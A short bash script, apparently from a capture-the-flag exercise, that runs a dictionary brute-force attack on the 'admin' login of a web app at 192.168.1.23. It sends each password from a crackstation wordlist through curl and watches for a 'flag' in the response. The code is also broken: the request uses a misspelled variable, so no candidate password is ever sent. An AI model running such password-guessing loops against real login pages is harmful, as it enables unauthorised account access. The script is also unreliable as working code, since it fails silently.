#!/bin/bash
# set -euo pipefail

# password=1
username="admin"
# dictionary="crackstation-human-only.txt"
dictionary="crackstation.txt"

# while :
# do
# 	echo "trying : $password"
# 	curl -s "http://192.168.1.23/?page=signin&username=$username&password=$pasword&Login=Login#" | grep -i flag

# 	if [ $? -eq 0 ]
# 	then
# 		echo "Found the value of the image : $password"
# 		exit
# 	fi
# 	sleep 0.3
# 	password=$((i+1))
# done

while IFS= read -r password;
do
	echo "trying : $password"
	curl -s "http://192.168.1.23/?page=signin&username=$username&password=$pasword&Login=Login#" | grep -i flag

	if [ $? -eq 0 ]
	then
		echo "Found the value of the image : $password"
		exit
	fi
	# sleep 0.3
done < $dictionary